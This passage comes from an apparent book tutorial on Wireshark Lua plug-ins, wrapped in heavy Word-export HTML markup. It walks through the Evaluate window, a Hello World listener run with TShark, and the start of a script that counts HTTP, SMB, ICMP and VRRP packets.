style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Wireshark Evaluate Lua</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local newwindow = TextWindow.new("Title of Window Here") newwindow:set("User dir is : " .. USER_DIR)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >And then you click Evaluate. A new window should appear stating your Wireshark&#8217;s user directory, as shown in </span><span><a href="#_bookmark630" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:25.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Don&#8217;t worry too much about understanding the code now. The main point to take away is that you can use the Evaluate window to dynamically run Lua code with access to the Wireshark variables, methods, and so on. This is handy <a name="_bookmark631" ></a>when you want to quickly test something Wireshark-specific but don&#8217;t want to write a complete stand-alone script.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Manual and Wiki options under the Lua Tools menu are simply links to the Wireshark-hosted Lua manual and Wiki section on Lua. These are really helpful and should be considered a valuable resource when exploring Lua and Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Hello World with TShark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section336" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >No tutorial about a programming language is complete without the obligatory Hello World program. To illustrate the basic structure of a Lua plug-in for Wireshark, we will show a program that prints Hello World to the screen and walk through it line by line. This example is a little different from the regular Hello World in Lua because it shows the most basic plug-in layout instead of printing to the screen without actually interacting with Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:7.7500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >helloworld.lua</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local function HelloWorldListener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:90.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- creating the listener with a filter for 'http' local listener = Listener.new(nil, 'http')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function listener.packet(pinfo, tvb)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- <a name="_bookmark632" ></a>this is called for every packet meeting the filter,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:259.0000pt;margin-left:29.5500pt;text-indent:-21.6000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >-- i.e. 'http' in this example end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:280.6000pt;margin-left:51.1500pt;text-indent:-21.6000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function listener.draw() print('Hello World')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:431.8000pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >end end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >HelloWorldListener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  align=justify  style="margin-right:40.7000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To test the program, run it with TShark, as shown in the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >following snippet. The plug-in is called by the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-X</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option with the arguments </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >lua_script:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >followed by the path or name of the Lua script:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~/$ tshark -q -r smbfiletest2 -X lua_script:helloworld.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:381.3500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Hello World localhost:~/$</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >First, a local function called </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >HelloWorldListener </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is defined. This function defines a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Listener</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >object that receives all SMB packets. This is a display filter in essence. The function continues by defining two callback functions in the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >listener</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.9500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >object. The first function, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >packet</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, is called for each </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >packet</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >matching the display filter and does nothing in this example, but is included to show the regular layout of a plug-in.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section337" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:15.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The second function, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >draw</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, is called at the end of the session. In this case, the end of the session is at the end of the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >pcap</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >being analyzed. In this example, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >draw </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function is used to print Hello World, but in a real-world plug-in it would be the place to print a summary. The final line calls the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >HelloWorldListener</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to start execution of the plug-in.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.2500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It is not necessary to explicitly call the Lua plug-in with the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-X</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option every time you want to use it. Wireshark automatically loads Lua scripts from its Lua search path, which includes the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >USER_DIR</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable that we examined when looking at the Evaluate menu in Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The best place to put your own Lua scripts that you want to load automatically is </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >$HOME/.wireshark/plugins/</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >on Linux or</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:10.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >%appdata%\Roaming\Wireshark\plugins\</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.9000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for Windows. Do not auto load resource-intensive scripts, as this can cause Wireshark to slow down.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Counting Packets Script</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To get started with processing packets, we take the structure of the Hello World plug-in and expand it to print out a summary of a packet capture. This new script keeps counters for total packets and common protocols to get a feel for working with packets in Lua scripts and presenting the information you gathered. In <a name="_bookmark633" ></a>the previous example, you already created the scaffolding to achieve this. The listener you created has two callbacks. These two functions are going to be filled in now to count the packets received by the listener.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:10.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In order to receive all types of packets, the listener is initialized with an empty filter. Next is the definition of the packet handler that is called for each packet. This handler needs to increment each relevant global counter depending on what protocol the packet contains. Each packet has to be tested for several fields to determine the correct protocol. Before accessing these fields to test for what protocol, you have to define them. You do this using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Wireshark Field .new() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function. You have to create a local variable for each field in which you are interested. The following code shows how you do this within your new counting packet script:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.0500pt;margin-right:178.7000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local proto = Field.new('ip.proto') local httpfield = Field.new('http')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section338" ><p class=MsoNormal  style="margin-top:3.9000pt;margin-right:187.0500pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local smbfield = Field.new('smb') local icmpfield = Field.new('icmp') local vrrpfield = Field.new('vrrp')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A field variable has been created for the IP protocol field with packets that are identified as HTTP, SMB, ICMP, and VRRP. SMB is the protocol that Windows uses for file sharing (among other things), and VRRP (Virtual Router Redundancy Protocol) is used to support hot failover in routers. You do not have to know much about these protocols for now; just know that they are packets that you can filter on in Wireshark, and that you want to make sure for every packet you try to see if it has one of these fields associated with it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.8000pt;margin-right:9.3000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once the field variables are defined you can test for their existence</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and create the counting logic you are looking for. The following code</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows our packet-counting</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >logic:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(icmpfield()) then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:230.2500pt;margin-left:51.1500pt;text-indent:7.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >icmpcounter = icmpcounter+1 end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:229.0000pt;margin-left:58.3500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(vrrpfield()) then vrrpcounter = vrrpcounter+1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:51.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:17.2500pt;margin-left:58.3500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(protocolnumber and protocolnumber.value == 6) then local http = httpfield()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:266.2000pt;margin-left:58.3500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local smb = smbfield() if http then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:87.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >httpcounter = httpcounter+1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:58.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  